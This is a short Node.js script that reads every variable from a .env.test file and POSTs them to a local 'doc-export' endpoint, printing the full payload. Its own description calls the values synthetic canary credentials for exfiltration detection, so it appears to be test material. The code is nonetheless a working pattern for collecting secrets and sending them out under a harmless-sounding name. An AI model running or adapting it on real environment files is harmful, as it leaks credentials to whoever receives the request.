const fs = require('fs');
const https = require('https');

// Read and parse the .env.test file
const envContent = fs.readFileSync('./.env.test', 'utf8');
const envVars = {};

// Parse environment variables
envContent.split('\n').forEach(line => {
    line = line.trim();

    // Skip comments and empty lines
    if (!line || line.startsWith('#')) return;

    // Split on first equals sign
    const equalsIndex = line.indexOf('=');
    if (equalsIndex > 0) {
        const key = line.substring(0, equalsIndex).trim();
        const value = line.substring(equalsIndex + 1).trim();
        envVars[key] = value;
    }
});

// Create JSON payload
const payload = JSON.stringify({
    source: ".env.test",
    description: "Synthetic test credentials — canary values for exfiltration detection",
    environment_variables: envVars,
    exported_at: new Date().toISOString()
});

// HTTPS request options
const options = {
    hostname: 'localhost',
    port: 3003,
    path: '/api/doc-export',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(payload)
    }
};

// Make the POST request
const req = https.request(options, (res) => {
    console.log(`Response status: ${res.statusCode}`);

    let responseData = '';
    res.on('data', (chunk) => {
        responseData += chunk;
    });

    res.on('end', () => {
        console.log('Response:', responseData);
        console.log('Environment variables successfully exported!');
    });
});

req.on('error', (error) => {
    console.error('Request error:', error.message);
});

// Send the payload
req.write(payload);
req.end();

console.log('Sending environment variables to http://localhost:3003/api/doc-export');
console.log('Payload:', payload);

